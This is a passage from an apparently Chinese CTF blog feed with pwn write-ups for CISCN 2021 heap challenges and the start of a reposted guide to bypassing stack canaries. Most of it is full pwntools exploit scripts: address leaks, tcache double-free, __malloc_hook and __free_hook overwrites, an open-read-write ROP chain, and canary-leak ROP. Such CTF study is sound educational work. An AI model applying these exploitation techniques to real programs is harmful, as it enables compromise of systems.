&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><span class="hljs-comment"># count</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>environ = base+libc.sym[<span class="hljs-string">&quot;environ&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ: &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br>oneshot = [<span class="hljs-number">0x415b6</span>, <span class="hljs-number">0x4160a</span>, <span class="hljs-number">0xdfae1</span>]<br>oneshot = base+oneshot[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># leak stack addr</span><br>offset = <span class="hljs-built_in">int</span>((environ-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>read(p64(offset &amp; <span class="hljs-number">0xffffffffffffffff</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>write_ret = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_ret: &quot;</span>, <span class="hljs-built_in">hex</span>(write_ret))<br><br><span class="hljs-comment"># attack</span><br>offset = <span class="hljs-built_in">int</span>((write_ret-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>write_con(offset, p64(oneshot))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="二、lonelywolf"><a href="#二、lonelywolf" class="headerlink" title="二、lonelywolf"></a>二、lonelywolf</h3><p>程序存在UAF，double free把堆块申请到tcache 上，将之释放得到libc，然后分配到malloc_hook上执行one_gadget即可，注意的是double free时，要free一次后往里面写数据覆盖key，绕过检查，才能二次free</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;124.70.0.162&#x27;,26313)</span><br>p=process(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><br>allocate(<span class="hljs-number">0x60</span>)<br>delete()<br>edit(p64(<span class="hljs-number">0</span>))<br>delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;heap addr:&quot;</span> + <span class="hljs-built_in">hex</span>(heap))<br>edit(p64(heap - <span class="hljs-number">0x250</span>))<br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):<br>	edit(p64(<span class="hljs-number">0</span>))<br>	delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>one_gadget = libc_base + <span class="hljs-number">0x10a41c</span>      <span class="hljs-comment">#0x4f3d5, 0x4f432, 0x10a41c</span><br>__malloc_hook = libc_base + __malloc_hook<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %__malloc_hook)<br>log.info(<span class="hljs-string">&quot;one_gadget:0x%x&quot;</span> %one_gadget)<br>allocate(<span class="hljs-number">0x50</span>)<br>edit(p64(<span class="hljs-number">0</span>))<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(__malloc_hook))<br>delete()<br>edit(p64(__malloc_hook))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(one_gadget))<br>gdb.attach(p,<span class="hljs-string">&quot;b*main&quot;</span>)<br>allocate(<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>时隔几月，总算是有能力来复现了，真不容易，不忘初心，砥砺前行！</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084726694.png"><span class="image-caption">image-20210925084726694</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084839791.png"><span class="image-caption">image-20210925084839791</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084858088.png"><span class="image-caption">image-20210925084858088</span></p>
<p>程序一开始就初始化了沙箱，看来是道orw的题了</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085147596.png"><span class="image-caption">image-20210925085147596</span></p>
<p>add功能里面，只能申请小等于0x78的堆块，然后堆块结构体只存放一个堆块，也就是我们后续操作只能对着当前堆块进行</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085714119.png"><span class="image-caption">image-20210925085714119</span></p>
<p>delete功能存在UAF漏洞</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085753680.png"><span class="image-caption">image-20210925085753680</span></p>
<p>show功能打印堆块内容</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925090452594.png"><span class="image-caption">image-20210925090452594</span></p>
<p>edit功能往堆块里面写内容</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925091304553.png"><span class="image-caption">image-20210925091304553</span></p>
<p>由于开启沙箱，堆块存在十分多，把存放有堆地址的堆块申请出来，泄露堆地址</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094259648.png"><span class="image-caption">image-20210925094259648</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094827325.png"><span class="image-caption">image-20210925094827325</span></p>
<p>通过得到的堆地址，以及UAF把堆块申请到tcache上去，然后修改tcache entries，破坏结构，然后释放tcache，得到libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925102647508.png"><span class="image-caption">image-20210925102647508</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163718481.png"><span class="image-caption">image-20210925163718481</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163939660.png"><span class="image-caption">image-20210925163939660</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925164137807.png"><span class="image-caption">image-20210925164137807</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925165150750.png"><span class="image-caption">image-20210925165150750</span></p>
<p>由于前面产生libc地址破坏了堆块，所以要再重新修复一下，并且还要继续利用，所以在修复的同时也要再次覆盖chunk在上面，因为我们的申请的堆块大小有限制，所以要从把堆块劫持到0x20开始（前0x40是count），然后这边生成出的堆块是0x40，刚好，如果是从0x20开始，一直到0x80都是我们能申请的大小，而这跨度刚好是0x38，十分巧妙！膜拜大佬！</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925104646878.png"><span class="image-caption">image-20210925104646878</span></p>
<p>然后就是往那个堆块填充我们需要分配堆块的地址，就可以一块块的分配出去，完成free_hook写setcontext，设置’./flag\x00’地址，gadget所需寄存器的值设置以及rop填充地址，等等</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925174414433.png"><span class="image-caption">image-20210925174414433</span></p>
<p>这里说一下，要用系统调用来调用open函数，否则会在运行到open函数直接报错退出，具体不懂，我跟踪到open函数发现fd分配到的数值很大，rdi什么的也是不对劲，具体原因不明白，然后就是，后面虽然一个堆块放不下rop，但是，分配出去的堆块我惊讶的发现是没有堆头的，所以rop仍然是连贯的</p>
<p>总的来说，还是完成了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x00000000000215bf</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x0000000000023eea</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b96</span> + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>read = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-comment">#open = libc_base + libc.sym[&quot;open&quot;]</span><br>rop_addr = heap_addr+<span class="hljs-number">0x1000</span><br>flag_addr = heap_addr+<span class="hljs-number">0x2000</span><br><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br>log.info(<span class="hljs-string">&quot;orw rop len is: &quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop)))<br>add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span><br>edit(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x18</span>)<br>edit(p64(heap_addr + <span class="hljs-number">0x50</span>))<br>add(<span class="hljs-number">0x38</span>)<br>payload = p64(free_hook) + p64(flag_addr) + p64(heap_addr + <span class="hljs-number">0x2000</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x20A0</span>) + p64(rop_addr) + p64(rop_addr+<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(setcontext))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(p64(rop_addr) + p64(ret))<br>add(<span class="hljs-number">0x50</span>)<br>edit(rop[:<span class="hljs-number">0x50</span>])<br>add(<span class="hljs-number">0x60</span>)<br>edit(rop[<span class="hljs-number">0x50</span>:])<br>add(<span class="hljs-number">0x30</span>)<br>free()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>由于其他的题目我还未彻底学会，所以这里贴上大佬的博客，里面有其他题目的wp：</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p>
<p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>canary合集——转载</title>
    <url>/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="转载自N神博客"><a href="#转载自N神博客" class="headerlink" title="转载自N神博客"></a>转载自<a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more">N神博客</a></h1><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">Canary中文意译为金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警<br></code></pre></td></tr></table></figure>

<p>那么，我们可以简单把它理解成一个类似于cookie之类的东西，程序执行时需要验证它是正确的才能正常向下执行<br>通常的栈溢出利用，需要覆盖返回地址以控制程序流，那么只需要在覆盖返回地址之前插入一个叫Canary的cookie信息，当函数返回之时检测Canary的值是否被更改，就可以判断是否发生了栈溢出这种危险行为，如果Canary被更改，程序会去执行__stack_chk_fail函数并结束。<br>一般来说，canary大部分情况都是在rbp-0x8的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/1.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/1-1622104561265.png"><span class="image-caption">img</span></a><br>栈中的canary大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/2.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/2.png"><span class="image-caption">img</span></a></p>
<h2 id="覆盖低字节泄露Canary"><a href="#覆盖低字节泄露Canary" class="headerlink" title="覆盖低字节泄露Canary"></a>覆盖低字节泄露Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>
<h3 id="例题：攻防世界-厦门邀请赛pwn1"><a href="#例题：攻防世界-厦门邀请赛pwn1" class="headerlink" title="例题：攻防世界_厦门邀请赛pwn1"></a>例题：攻防世界_厦门邀请赛pwn1</h3><p>分析下代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/3.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/3.png"><span class="image-caption">img</span></a><br>存在栈溢出，canary在rbp-0x8的位置，可以将输入的字符串打印出来<br>那思路就很明确了<br>先通过多写1字节将\x00覆盖，然后打印泄露Canary，最后直接ROP<br>覆盖完大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/4.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/4.png"><span class="image-caption">img</span></a></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span><br><span class="hljs-attribute">binary</span> = &#x27;./babystack&#x27;<br><span class="hljs-attribute">local</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> local == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">p</span>=process(binary)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-attribute">elf</span>=ELF(binary)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400</span>a<span class="hljs-number">93</span><br><span class="hljs-attribute">puts_got</span> = elf.got[&#x27;puts&#x27;]<br><span class="hljs-attribute">puts_plt</span> = elf.plt[&#x27;puts&#x27;]<br><span class="hljs-attribute">start</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400720</span><br><span class="hljs-attribute">def</span> exp():<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span><br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + &#x27;\n&#x27;)<br>    <span class="hljs-attribute">canary</span> = u<span class="hljs-number">64</span>(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(puts_got) + p<span class="hljs-number">64</span>(puts_plt) + p<span class="hljs-number">64</span>(start)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br>    <span class="hljs-attribute">one_gadget</span> = libc_base + <span class="hljs-number">0</span>xf<span class="hljs-number">1207</span><br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(one_gadget)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span 